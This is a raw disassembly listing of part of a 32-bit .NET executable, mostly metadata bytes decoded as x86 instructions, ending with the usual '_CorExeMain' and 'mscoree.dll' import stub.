  40c20e:	03 01                	add    (%ecx),%eax
  40c210:	12 61 02             	adc    0x2(%ecx),%ah
  40c213:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c219:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c21f:	01 0e                	add    %ecx,(%esi)
  40c221:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c227:	02 09                	add    (%ecx),%cl
  40c229:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c22c:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c232:	0c 20                	or     $0x20,%al
  40c234:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c239:	08 08                	or     %cl,(%eax)
  40c23b:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c241:	01 11                	add    %edx,(%ecx)
  40c243:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c249:	02 12                	add    (%edx),%dl
  40c24b:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c24e:	02 08                	add    (%eax),%cl
  40c250:	08 05 20 01 08 12    	or     %al,0x12080120
  40c256:	25 06 00 02 08       	and    $0x8020006,%eax
  40c25b:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c260:	03 08                	add    (%eax),%ecx
  40c262:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c267:	20 01                	and    %al,(%ecx)
  40c269:	01 12                	add    %edx,(%edx)
  40c26b:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c271:	1c 0c                	sbb    $0xc,%al
  40c273:	07                   	pop    %es
  40c274:	06                   	push   %es
  40c275:	1c 02                	sbb    $0x2,%al
  40c277:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c27c:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c282:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c285:	02 07                	add    (%edi),%al
  40c287:	20 02                	and    %al,(%edx)
  40c289:	02 08                	add    (%eax),%cl
  40c28b:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c291:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c297:	07                   	pop    %es
  40c298:	0a 12                	or     (%edx),%dl
  40c29a:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c2a1:	08 12 81 
  40c2a4:	41                   	inc    %ecx
  40c2a5:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c2ab:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c2b0:	4d                   	dec    %ebp
  40c2b1:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c2b6:	0e                   	push   %cs
  40c2b7:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2bc:	41                   	inc    %ecx
  40c2bd:	05 20 00 12 81       	add    $0x81120020,%eax
  40c2c2:	55                   	push   %ebp
  40c2c3:	06                   	push   %es
  40c2c4:	00 00                	add    %al,(%eax)
  40c2c6:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c2cb:	00 01                	add    %al,(%ecx)
  40c2cd:	0e                   	push   %cs
  40c2ce:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c2d3:	01 11                	add    %edx,(%ecx)
  40c2d5:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c2dc:	41                   	inc    %ecx
  40c2dd:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c2e3:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c2ea:	49                   	dec    %ecx
  40c2eb:	0e                   	push   %cs
  40c2ec:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c2f2:	0e                   	push   %cs
  40c2f3:	0e                   	push   %cs
  40c2f4:	0e                   	push   %cs
  40c2f5:	0e                   	push   %cs
  40c2f6:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c2fb:	1c 07                	sbb    $0x7,%al
  40c2fd:	20 02                	and    %al,(%edx)
  40c2ff:	01 0e                	add    %ecx,(%esi)
  40c301:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c307:	0a 02                	or     (%edx),%al
  40c309:	10 07                	adc    %al,(%edi)
  40c30b:	06                   	push   %es
  40c30c:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c312:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c318:	0e                   	push   %cs
  40c319:	02 05 20 00 12 81    	add    0x81120020,%al
  40c31f:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c325:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c32b:	91                   	xchg   %eax,%ecx
  40c32c:	04 20                	add    $0x20,%al
  40c32e:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c331:	04 07                	add    $0x7,%al
  40c333:	02 02                	add    (%edx),%al
  40c335:	02 03                	add    (%ebx),%al
  40c337:	20 00                	and    %al,(%eax)
  40c339:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c33c:	02 18                	add    (%eax),%bl
  40c33e:	02 03                	add    (%ebx),%al
  40c340:	07                   	pop    %es
  40c341:	01 0e                	add    %ecx,(%esi)
  40c343:	05 00 00 12 81       	add    $0x81120000,%eax
  40c348:	9d                   	popf
  40c349:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c34e:	1c 0a                	sbb    $0xa,%al
  40c350:	07                   	pop    %es
  40c351:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c356:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c35b:	20 01                	and    %al,(%ecx)
  40c35d:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c363:	0e                   	push   %cs
  40c364:	08 08                	or     %cl,(%eax)
  40c366:	06                   	push   %es
  40c367:	07                   	pop    %es
  40c368:	02 02                	add    (%edx),%al
  40c36a:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c370:	0e                   	push   %cs
  40c371:	0e                   	push   %cs
  40c372:	0e                   	push   %cs
  40c373:	05 20 00 11 81       	add    $0x81110020,%eax
  40c378:	ad                   	lods   %ds:(%esi),%eax
  40c379:	05 00 00 12 81       	add    $0x81120000,%eax
  40c37e:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c383:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c389:	02 11                	add    (%ecx),%dl
  40c38b:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c391:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c398:	12 81 8d 
  40c39b:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c3a1:	12 41 01             	adc    0x1(%ecx),%al
  40c3a4:	0e                   	push   %cs
  40c3a5:	05 20 01 01 13       	add    $0x13010120,%eax
  40c3aa:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c3b0:	00 06                	add    %al,(%esi)
  40c3b2:	00 02                	add    %al,(%edx)
  40c3b4:	0e                   	push   %cs
  40c3b5:	0e                   	push   %cs
  40c3b6:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c3bb:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c3c0:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c3c6:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c3cc:	c5 09                	lds    (%ecx),%ecx
  40c3ce:	00 02                	add    %al,(%edx)
  40c3d0:	02 11                	add    (%ecx),%dl
  40c3d2:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c3d8:	07                   	pop    %es
  40c3d9:	02 12                	add    (%edx),%dl
  40c3db:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c3e0:	01 02                	add    %eax,(%edx)
  40c3e2:	0e                   	push   %cs
  40c3e3:	10 02                	adc    %al,(%edx)
  40c3e5:	06                   	push   %es
  40c3e6:	00 01                	add    %al,(%ecx)
  40c3e8:	01 12                	add    %edx,(%edx)
  40c3ea:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c3f0:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c3f7:	0e                   	push   %cs
  40c3f8:	1c 11                	sbb    $0x11,%al
  40c3fa:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c400:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c407:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c40d:	05 07 20 02 12       	add    $0x12022007,%eax
  40c412:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c419:	12 60 0e             	adc    0xe(%eax),%ah
  40c41c:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c421:	12 60 12             	adc    0x12(%eax),%ah
  40c424:	60                   	pusha
  40c425:	06                   	push   %es
  40c426:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c42b:	60                   	pusha
  40c42c:	10 10                	adc    %dl,(%eax)
  40c42e:	01 01                	add    %eax,(%ecx)
  40c430:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c435:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c43b:	1e                   	push   %ds
  40c43c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c43f:	01 12                	add    %edx,(%edx)
  40c441:	60                   	pusha
  40c442:	09 20                	or     %esp,(%eax)
  40c444:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c44a:	13 00                	adc    (%eax),%eax
  40c44c:	07                   	pop    %es
  40c44d:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c452:	12 60 04             	adc    0x4(%eax),%ah
  40c455:	20 00                	and    %al,(%eax)
  40c457:	13 00                	adc    (%eax),%eax
  40c459:	05 20 01 02 13       	add    $0x13020120,%eax
  40c45e:	00 03                	add    %al,(%ebx)
  40c460:	07                   	pop    %es
  40c461:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c468:	e5 07                	in     $0x7,%eax
  40c46a:	20 01                	and    %al,(%ecx)
  40c46c:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c472:	20 01                	and    %al,(%ecx)
  40c474:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c47a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c47d:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c483:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c489:	00 02                	add    %al,(%edx)
  40c48b:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c491:	0e                   	push   %cs
  40c492:	1c 00                	sbb    $0x0,%al
  40c494:	05 12 82 05 11       	add    $0x11058212,%eax
  40c499:	82 09 0e             	orb    $0xe,(%ecx)
  40c49c:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4a1:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c4a7:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4ac:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c4b2:	45                   	inc    %ebp
  40c4b3:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c4b9:	4d                   	dec    %ebp
  40c4ba:	1c 12                	sbb    $0x12,%al
  40c4bc:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4c1:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4c6:	0e                   	push   %cs
  40c4c7:	0b 00                	or     (%eax),%eax
  40c4c9:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c4cf:	00 12                	add    %dl,(%edx)
  40c4d1:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c4d8:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c4dd:	4d                   	dec    %ebp
  40c4de:	1c 12                	sbb    $0x12,%al
  40c4e0:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4e5:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4ea:	0e                   	push   %cs
  40c4eb:	17                   	pop    %ss
  40c4ec:	20 0a                	and    %cl,(%edx)
  40c4ee:	01 13                	add    %edx,(%ebx)
  40c4f0:	00 13                	add    %dl,(%ebx)
  40c4f2:	01 13                	add    %edx,(%ebx)
  40c4f4:	02 13                	add    (%ebx),%dl
  40c4f6:	03 13                	add    (%ebx),%edx
  40c4f8:	04 13                	add    $0x13,%al
  40c4fa:	05 13 06 13 07       	add    $0x7130613,%eax
  40c4ff:	13 08                	adc    (%eax),%ecx
  40c501:	13 09                	adc    (%ecx),%ecx
  40c503:	05 07 01 12 82       	add    $0x82120107,%eax
  40c508:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c50d:	0e                   	push   %cs
  40c50e:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c513:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c519:	06                   	push   %es
  40c51a:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c520:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c526:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c52b:	20 01                	and    %al,(%ecx)
  40c52d:	01 11                	add    %edx,(%ecx)
  40c52f:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c536:	82 31 05             	xorb   $0x5,(%ecx)
  40c539:	20 00                	and    %al,(%eax)
  40c53b:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c541:	01 12                	add    %edx,(%edx)
  40c543:	61                   	popa
  40c544:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c54a:	08 20                	or     %ah,(%eax)
  40c54c:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c552:	08 1a                	or     %bl,(%edx)
  40c554:	07                   	pop    %es
  40c555:	0a 12                	or     (%edx),%dl
  40c557:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c55e:	21 1d 05 
  40c561:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c566:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c56d:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c572:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c578:	45                   	inc    %ebp
  40c579:	08 08                	or     %cl,(%eax)
  40c57b:	04 07                	add    $0x7,%al
  40c57d:	02 02                	add    (%edx),%al
  40c57f:	08 09                	or     %cl,(%ecx)
  40c581:	00 02                	add    %al,(%edx)
  40c583:	01 12                	add    %edx,(%edx)
  40c585:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c589:	4d                   	dec    %ebp
  40c58a:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c58f:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c595:	05 08 05 07 07       	add    $0x7070508,%eax
  40c59a:	02 12                	add    (%edx),%dl
  40c59c:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c5a0:	08 07                	or     %al,(%edi)
  40c5a2:	04 12                	add    $0x12,%al
  40c5a4:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c5a9:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c5ae:	1c 06                	sbb    $0x6,%al
  40c5b0:	07                   	pop    %es
  40c5b1:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c5b7:	20 01                	and    %al,(%ecx)
  40c5b9:	13 00                	adc    (%eax),%eax
  40c5bb:	08 04 07             	or     %al,(%edi,%eax,1)
  40c5be:	01 12                	add    %edx,(%edx)
  40c5c0:	60                   	pusha
  40c5c1:	0e                   	push   %cs
  40c5c2:	07                   	pop    %es
  40c5c3:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c5c8:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c5ce:	12 60 07             	adc    0x7(%eax),%ah
  40c5d1:	07                   	pop    %es
  40c5d2:	04 08                	add    $0x8,%al
  40c5d4:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c5d9:	20 01                	and    %al,(%ecx)
  40c5db:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c5e1:	64 04 00             	fs add $0x0,%al
  40c5e4:	01 0b                	add    %ecx,(%ebx)
  40c5e6:	0a 04 00             	or     (%eax,%eax,1),%al
  40c5e9:	01 0b                	add    %ecx,(%ebx)
  40c5eb:	0e                   	push   %cs
  40c5ec:	04 00                	add    $0x0,%al
  40c5ee:	01 0b                	add    %ecx,(%ebx)
  40c5f0:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c5f5:	0c 06                	or     $0x6,%al
  40c5f7:	00 01                	add    %al,(%ecx)
  40c5f9:	0b 11                	or     (%ecx),%edx
  40c5fb:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c602:	04 00 01 
  40c605:	0a 0e                	or     (%esi),%cl
  40c607:	04 00                	add    $0x0,%al
  40c609:	01 0a                	add    %ecx,(%edx)
  40c60b:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c610:	0c 06                	or     $0x6,%al
  40c612:	00 01                	add    %al,(%ecx)
  40c614:	0a 11                	or     (%ecx),%dl
  40c616:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c61d:	04 00 01 
  40c620:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c625:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c629:	ad                   	lods   %ds:(%esi),%eax
  40c62a:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c62f:	0c 07                	or     $0x7,%al
  40c631:	07                   	pop    %es
  40c632:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c638:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c63d:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c643:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c649:	12 60 1d             	adc    0x1d(%eax),%ah
  40c64c:	0e                   	push   %cs
  40c64d:	0e                   	push   %cs
  40c64e:	08 12                	or     %dl,(%edx)
  40c650:	60                   	pusha
  40c651:	08 05 07 01 12 81    	or     %al,0x81120107
  40c657:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c65c:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c663:	05 08 08 06 00       	add    $0x60808,%eax
  40c668:	02 07                	add    (%edi),%al
  40c66a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c66f:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c676:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c67c:	00 02                	add    %al,(%edx)
  40c67e:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c684:	02 0b                	add    (%ebx),%cl
  40c686:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c68b:	02 06                	add    (%esi),%al
  40c68d:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c692:	02 0a                	add    (%edx),%cl
  40c694:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c699:	03 12                	add    (%edx),%edx
  40c69b:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c6a2:	07 02 12 
  40c6a5:	60                   	pusha
  40c6a6:	02 04 07             	add    (%edi,%eax,1),%al
  40c6a9:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c6af:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c6b4:	04 1d                	add    $0x1d,%al
  40c6b6:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c6bb:	06                   	push   %es
  40c6bc:	07                   	pop    %es
  40c6bd:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c6c3:	00 01                	add    %al,(%ecx)
  40c6c5:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c6ca:	06                   	push   %es
  40c6cb:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c6d1:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c6d7:	05 08 20 02 01       	add    $0x1022008,%eax
  40c6dc:	12 61 11             	adc    0x11(%ecx),%ah
  40c6df:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c6e3:	04 12                	add    $0x12,%al
  40c6e5:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c6ec:	1d 05 00 
  40c6ef:	00 18                	add    %bl,(%eax)
  40c6f1:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c6f7:	00 00                	add    %al,(%eax)
  40c6f9:	00 00                	add    %al,(%eax)
  40c6fb:	00 2e                	add    %ch,(%esi)
  40c6fd:	c7 00 00 00 20 00    	movl   $0x200000,(%eax)
	...
  40c717:	00 20                	add    %ah,(%eax)
  40c719:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c71f:	00 00                	add    %al,(%eax)
  40c721:	00 5f 43             	add    %bl,0x43(%edi)
  40c724:	6f                   	outsl  %ds:(%esi),(%dx)
  40c725:	72 45                	jb     0x40c76c
  40c727:	78 65                	js     0x40c78e
  40c729:	4d                   	dec    %ebp
  40c72a:	61                   	popa
  40c72b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c732:	72 65                	jb     0x40c799
  40c734:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c738:	6c                   	insb   (%dx),%es:(%edi)
  40c739:	00 00                	add    %al,(%eax)
  40c73b:	00 00                	add    %al,(%eax)
  40c73d:	00 ff                	add    %bh,%bh
  40c73f:	25 00 20 40 00       	and    $0x402000,%eax
